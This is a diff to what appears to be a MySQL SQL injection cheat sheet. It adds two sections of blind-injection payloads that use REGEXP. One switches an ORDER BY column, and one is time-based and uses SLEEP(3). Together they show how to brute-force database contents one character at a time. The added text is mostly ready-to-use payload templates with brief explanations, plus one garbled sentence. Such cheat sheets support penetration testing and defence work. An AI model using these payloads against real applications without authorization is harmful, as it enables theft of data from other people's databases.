@@ -232,6 +232,29 @@ Works with `MySQL >= 5.1`
 ?id=1 AND SELECT SUBSTR(column_name,1,1) FROM information_schema.columns > 'A'
 ```
 
+### MySQL Blind SQL Injection in ORDER BY clause using a binary query and REGEXP
+
+This query basically orders by one column or the other, depending on whether the EXISTS() returns a 1 or not.
+For the EXISTS() function to return a 1, the REGEXP query needs to match up, this means you can bruteforce blind values character by character and leak data from the database without direct output.
+
+```
+[...] ORDER BY (SELECT (CASE WHEN EXISTS(SELECT [COLUMN] FROM [TABLE] WHERE [COLUMN] REGEXP "^[BRUTEFORCE CHAR BY CHAR].*" AND [FURTHER OPTIONS / CONDITIONS]) THEN [ONE COLUMN TO ORDER BY] ELSE [ANOTHER COLUMN TO ORDER BY] END)); -- -
+```
+
+### MySQL Blind SQL Injection binary query using REGEXP.
+
+Payload:
+```
+' OR (SELECT (CASE WHEN EXISTS(SELECT name FROM items WHERE name REGEXP "^a.*") THEN SLEEP(3) ELSE 1 END)); -- -
+```
+
+Would work in the query (where the "where" clause is the injection point):
+```
+SELECT name,price FROM items WHERE name = '' OR (SELECT (CASE WHEN EXISTS(SELECT name FROM items WHERE name REGEXP "^a.*") THEN SLEEP(3) ELSE 1 END)); -- -';
+```
+
+In said query, it will check to see if an item exists in the "name" column in the "items" database that starts with an "a". If it will sleep for 3 seconds per item.
+
 ### MYSQL Blind using a conditional statement
 
 TRUE: `if @@version starts with a 5`:
